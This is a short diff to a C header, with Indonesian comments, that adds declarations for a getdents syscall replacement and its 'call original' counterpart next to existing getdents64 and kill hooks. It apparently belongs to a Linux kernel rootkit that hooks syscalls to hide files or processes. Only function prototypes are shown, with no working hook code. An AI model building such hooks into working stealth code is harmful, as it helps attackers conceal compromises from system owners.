@@ -39,14 +39,18 @@ bool l4x_any_ports(void);
 #if L4X_OLD_ARGS
 /* ---- konvensi <4.17: argumen individual ---- */
 long l4x_sys_getdents64(unsigned int fd, char __user *dirp, unsigned int count);
+long l4x_sys_getdents(unsigned int fd, char __user *dirp, unsigned int count);
 long l4x_sys_kill(int pid, int sig);
 long l4x_call_orig_getdents64(unsigned int fd, char __user *dirp, unsigned int count);
+long l4x_call_orig_getdents(unsigned int fd, char __user *dirp, unsigned int count);
 long l4x_call_orig_kill(int pid, int sig);
 #else
 /* ---- konvensi >=4.17: pt_regs ---- */
 long l4x_sys_getdents64(const struct pt_regs *regs);
+long l4x_sys_getdents(const struct pt_regs *regs);
 long l4x_sys_kill(const struct pt_regs *regs);
 long l4x_call_orig_getdents64(const struct pt_regs *regs);
+long l4x_call_orig_getdents(const struct pt_regs *regs);
 long l4x_call_orig_kill(const struct pt_regs *regs);
 #endif
 
